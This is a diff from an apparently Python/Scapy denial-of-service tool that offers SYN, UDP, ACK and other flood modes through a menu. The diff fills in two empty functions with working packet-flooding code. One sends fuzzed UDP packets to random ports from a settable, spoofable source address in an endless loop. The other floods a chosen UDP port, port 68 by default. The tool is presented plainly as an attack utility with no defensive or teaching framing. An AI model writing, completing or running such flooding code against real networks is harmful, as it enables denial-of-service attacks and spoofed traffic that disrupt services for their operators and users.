@@ -128,9 +128,9 @@ def main():
 	if choice == '1': # beta
 		synFlood(src_ip,dst_ip,repeat,sport,dport,interval,power) 
 	elif choice == '2':
-		udpFlood()
+		udpFlood(src_ip,dst_ip,repeat)
 	elif choice == '3':
-		udpPlainFlood()
+		udpPlainFlood(src_ip,dst_ip,repeat,dport)
 	elif choice == '4': # beta
 		ackFlood(src_ip,dst_ip,repeat,sport,dport,interval,power)
 	elif choice == '5': # beta
@@ -381,12 +381,25 @@ def postAckFlood(dst,times,dport):
 
 	return 0
 
-def udpFlood():
+#################
+#   UDP FLOOD   #
+#################
 
+def udpFlood(src,dst,times):
+	print("UDP Flood with random data..")
+	packet = IP(src=src,dst=dst)/UDP(sport=RandShort(),dport=RandShort())/fuzz(Raw())
+	send(packet,verbose=0,loop=1)
 	return 0
 
-def udpPlainFlood():
+#################
+#   UDP PLAIN   #
+#################
 
+def udpPlainFlood(src,dst,times,dport):
+	print("UDP Plain Flood started")
+	if dport == 0: dport = 68 # Just using the dchp ports as default..
+	packet = IP(src=src,dst=dst)/UDP(dport=dport)
+	send(packet,verbose=0,loop=1)
 	return 0
 
 def dnsFlood():
